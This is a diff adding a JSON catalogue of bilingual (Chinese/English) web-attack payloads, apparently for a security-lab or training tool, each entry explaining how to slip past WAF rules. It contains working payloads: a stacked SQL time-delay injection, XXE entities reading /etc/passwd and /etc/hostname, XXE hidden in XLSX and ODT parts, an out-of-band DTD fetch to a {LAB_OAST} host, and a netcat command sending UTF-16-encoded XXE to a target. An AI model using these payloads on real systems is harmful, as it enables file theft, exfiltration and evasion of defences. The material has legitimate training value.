@@ -1,0 +1,338 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "sqli2-stacked-and-conditional-delay-probes",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "1'%0ASELECT SLEEP(5)--",
+          "command": "1';%0ASELECT/**/SLEEP(5)--",
+          "title": {
+            "zh": "分号堆叠换行遮蔽变体",
+            "en": "Semicolon Stack with Newline Cloaking"
+          },
+          "description": {
+            "zh": "保留分号真正堆叠第二条语句，换行 %0A 作语句间空白、/**/ 注释拆散 SELECT 与 SLEEP 的相邻特征，规避按单行匹配堆叠或延迟特征的正则；条件注记：仅在过滤层按单行解析分号时 %0A 才有额外遮蔽效果，做规范化归并的检测器仍可见分号；成功判据：目标响应延迟约 5 秒；失效条件：驱动或执行通道不允许多语句。",
+            "en": "Keeps the semicolon so a second statement genuinely stacks, then uses %0A as inter-statement whitespace and a /**/ comment to break the SELECT-SLEEP adjacency that regex rules key on. Condition note: the newline only adds cloaking against filters that parse line by line, while normalizing detectors still see the semicolon. Success: the response is delayed by roughly five seconds. Fails when the driver or execution channel refuses stacked statements."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": ";",
+              "explanation": {
+                "zh": "语句堆叠分隔符（必须保留）",
+                "en": "Statement stacking separator, kept intact"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "%0A",
+              "explanation": {
+                "zh": "换行作语句间空白遮蔽",
+                "en": "Newline doubling as inter-statement whitespace cloak"
+              },
+              "type": "value"
+            },
+            {
+              "part": "SELECT/**/SLEEP(5)",
+              "explanation": {
+                "zh": "注释拆散延迟调用相邻特征",
+                "en": "Comment splits the delay-call adjacency signature"
+              },
+              "type": "function"
+            },
+            {
+              "part": "--",
+              "explanation": {
+                "zh": "SQL行注释符",
+                "en": "SQL line comment"
+              },
+              "type": "comment"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "xxe-file-read",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><x>&x;</x>",
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/./passwd\">]><x>&x;</x>",
+          "title": {
+            "zh": "路径点号混淆变体",
+            "en": "Dot-Segment Path Obfuscation Variant"
+          },
+          "description": {
+            "zh": "在路径中插入 /./ 空层级段，规避对 file:///etc/passwd 固定串的匹配；点号段等价性依赖解析器侧路径归一化，未归一化的解析器按字面寻径会打开失败；补充差分点：部分解析器会在 SYSTEM 标识符内解码 &#101;tc 这类数字实体，多数按字面处理，同一命令的实体写法可作解析器指纹判别（本命令保持明文路径）。成功判据：WAF 放行且文件内容仍回显；失效条件：解析器不做点号段归一化，或过滤层在归一化后二次复检。",
+            "en": "Inserts empty /./ dot segments into the path to dodge rules matching the literal file:///etc/passwd string. The equivalence only holds where the parser normalizes the path; parsers that skip normalization resolve it literally and the open fails. Extra differential: a few parsers decode numeric entities such as &#101;tc inside SYSTEM identifiers while most treat them literally, so the same command written in entity form doubles as a parser fingerprint probe (this command keeps the path plaintext). Success: the rule lets the document through and file contents still echo. Fails when the parser skips dot-segment normalization or the filter re-inspects after normalizing."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/./",
+              "explanation": {
+                "zh": "空层级点号段，归一化后等价删除",
+                "en": "Empty dot segment, removed during path normalization"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/passwd",
+              "explanation": {
+                "zh": "归一化后等价的目标路径",
+                "en": "Equivalent target path after normalization"
+              },
+              "type": "url"
+            },
+            {
+              "part": "&x;",
+              "explanation": {
+                "zh": "根元素内实体引用读取文件",
+                "en": "Entity reference inside the root reads the file"
+              },
+              "type": "operator"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssti2-xlsx-sharedstrings-xxe-general-entity-resources",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "xl/workbook.xml:",
+          "command": "xl/workbook.xml:\n<?xml version=\"1.0\"?><!DOCTYPE w [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><definedNames><definedName name=\"m\">&x;</definedName></definedNames></workbook>",
+          "description": {
+            "zh": "workbook.xml 部件变体 — 实体引用放入 definedNames 的元素内容而非 sharedStrings，绕过对 si/t 节点的定向扫描（注意：外部实体不能置于 sheet name 等属性值位）；成功判据：定义名文本、转换错误或解析日志含文件内容。",
+            "en": "Puts the entity reference into definedName element content instead of sharedStrings to dodge scanners focused on si/t nodes; external entities cannot sit in attribute slots such as sheet names. Success: the defined-name text, a conversion error, or parse logs contain the file contents."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "xl/workbook.xml:",
+              "explanation": {
+                "zh": "工作簿部件标注",
+                "en": "Workbook part label"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<!ENTITY x SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明",
+                "en": "External entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<definedName name=\"m\">&x;</definedName>",
+              "explanation": {
+                "zh": "定义名元素内容位引用（属性位不可用）",
+                "en": "Entity in definedName element content, attribute slots are off limits"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/passwd",
+              "explanation": {
+                "zh": "系统文件目标",
+                "en": "System file target"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "xl/styles.xml:",
+          "command": "xl/styles.xml:\n<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><styleSheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><fonts count=\"1\"><font><name>&x;</name></font></fonts></styleSheet>",
+          "description": {
+            "zh": "样式表部件变体 — 在 styles 部件的元素内容处引用实体（formatCode 属性位不可用：外部实体禁止出现在属性值）；实体展开发生在 XML 解析期，即使样式层丢弃该节点，文件读取仍已发生；成功判据：worker 文件审计或解析日志出现对 /etc/hostname 的读取，或样式相关错误信息含主机名。",
+            "en": "References the entity in element content of the styles part; the formatCode attribute slot is off limits because external entities are barred from attribute values. Expansion happens at XML parse time, so the file is read even when the style layer discards the node. Success: the worker file audit or parse logs show a read of /etc/hostname, or a style-related error message contains the hostname."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "xl/styles.xml:",
+              "explanation": {
+                "zh": "样式部件标注",
+                "en": "Styles part label"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<!ENTITY x SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明",
+                "en": "External entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<name>&x;</name>",
+              "explanation": {
+                "zh": "字体名元素内容位引用",
+                "en": "Entity in font-name element content"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "file:///etc/hostname",
+              "explanation": {
+                "zh": "主机名文件目标",
+                "en": "Hostname file target"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "[Content_Types].xml:",
+          "command": "[Content_Types].xml:\n<?xml version=\"1.0\"?><!DOCTYPE t [<!ENTITY % p SYSTEM \"http://{LAB_OAST}/ct.dtd\">%p;]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/></Types>",
+          "description": {
+            "zh": "内容类型部件变体 — 包级 [Content_Types].xml 最早被解析，用内部参数实体在包加载阶段发起外链，早于表单数据部件检查点（Extension 属性位不可用：外部实体禁止出现在属性值）；成功判据：{LAB_OAST} 收到 ct.dtd 请求即证明包级部件外链未被拦截。",
+            "en": "The package-level [Content_Types].xml part is parsed first; an internal parameter entity fires the outbound link during package loading, ahead of form-data part checkpoints. The Extension attribute stays literal since external entities cannot appear in attribute values. Success: {LAB_OAST} receiving a request for ct.dtd proves the package-level outbound link was not blocked."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "[Content_Types].xml:",
+              "explanation": {
+                "zh": "包级部件标注",
+                "en": "Package-level part label"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<!ENTITY % p SYSTEM",
+              "explanation": {
+                "zh": "外部参数实体声明",
+                "en": "External parameter entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%p;",
+              "explanation": {
+                "zh": "参数实体引用在包加载期触发外链",
+                "en": "Parameter entity reference fires the outbound link during package load"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "Extension=\"xml\"",
+              "explanation": {
+                "zh": "属性位保持明文（不可放实体）",
+                "en": "Attribute slot stays literal, entities not allowed"
+              },
+              "type": "value"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssti2-odt-xxe-content-xml",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "styles.xml:",
+          "command": "styles.xml:\n<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><office:document-styles xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\" xmlns:style=\"urn:oasis:names:tc:opendocument:xmlns:style:1.0\"><office:styles><style:style style:name=\"m\" style:family=\"paragraph\">&x;</style:style></office:styles></office:document-styles>",
+          "description": {
+            "zh": "styles 部件变体 — 实体引用置于 styles.xml 元素内容处（style:name 属性位不可用：外部实体禁止出现在属性值）；实体展开发生在解析期，即便样式层丢弃未知节点，文件读取仍已发生；成功判据：转换 worker 文件审计或解析日志出现对 /etc/hostname 的读取，或样式相关错误信息含主机名。",
+            "en": "Places the entity reference in styles.xml element content; the style:name attribute slot stays literal because external entities cannot appear in attribute values. Expansion happens at parse time, so the file is read even if the style layer drops the node. Success: the conversion worker file audit or parse logs show a read of /etc/hostname, or a style-related error message contains the hostname."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "styles.xml:",
+              "explanation": {
+                "zh": "样式部件标注",
+                "en": "Styles part label"
+              },
+              "type": "value"
+            },
+            {
+              "part": "<!ENTITY x SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明",
+                "en": "External entity declaration"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "style:name=\"m\"",
+              "explanation": {
+                "zh": "样式名属性位保持明文",
+                "en": "Style-name attribute slot stays literal"
+              },
+              "type": "value"
+            },
+            {
+              "part": "&x;",
+              "explanation": {
+                "zh": "样式元素内容位实体引用",
+                "en": "Entity reference in style element content"
+              },
+              "type": "operator"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "webshell-xml-entity-file-and-oob-probes",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "POST /stockCheck HTTP/1.1",
+          "command": "printf '%s' '<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://{FILE_PATH}\">]><stockCheck><productId>&xxe;</productId></stockCheck>' | iconv -f UTF-8 -t UTF-16 > body.bin\nprintf 'POST /stockCheck HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Type: application/xml; charset=UTF-16\\r\\nContent-Length: '\"$(wc -c < body.bin)\"'\\r\\nConnection: close\\r\\n\\r\\n' | cat - body.bin | nc {TARGET} 80",
+          "description": {
+            "zh": "绕过按 ASCII 字节匹配 <!ENTITY/SYSTEM 的规则：先用 iconv 把整个 XML 转成 UTF-16 再发送，明文实体声明的 ASCII 特征在传输流中不复存在，请求以 Content-Type: application/xml; charset=UTF-16 声明编码，报文起始携带字节序标记（小端为 FF FE，大端为 FE FF）；成功判据：解析器按 BOM/编码声明正确解码、仍展开实体并回显文件；失效条件：解析器不做编码嗅探，或 WAF 具备 UTF-16 解码后再匹配的能力。",
+            "en": "Defeats rules that match the ASCII byte sequences of <!ENTITY/SYSTEM by transcoding the whole document to UTF-16 with iconv before sending, so the plaintext entity declaration leaves no ASCII signature in the stream. The request declares charset=UTF-16 and the body starts with a byte order mark (FF FE little-endian, FE FF big-endian) so the parser sniffs the encoding. Success: the parser decodes via BOM or encoding declaration, still expands the entity and echoes the file. Fails when the parser skips encoding sniffing or the WAF decodes UTF-16 before matching."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "charset=UTF-16",
+              "explanation": {
+                "zh": "声明UTF-16编码",
+                "en": "Declares UTF-16 encoding"
+              },
+              "type": "flag"
+            },
+            {
+              "part": "FF FE",
+              "explanation": {
+                "zh": "UTF-16 字节序标记字节（iconv 输出自带，大端为 FE FF）",
+                "en": "UTF-16 BOM bytes written by iconv (FE FF on big-endian)"
+              },
+              "type": "value"
+            },
+            {
+              "part": "iconv -f UTF-8 -t UTF-16",
+              "explanation": {
+                "zh": "整包转码为 UTF-16",
+                "en": "Transcodes the whole document to UTF-16"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "<!ENTITY xxe SYSTEM",
+              "explanation": {
+                "zh": "外部实体声明（UTF-16 下 ASCII 特征消失）",
+                "en": "External entity declaration, its ASCII signature gone under UTF-16"
+              },
+              "type": "payload"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
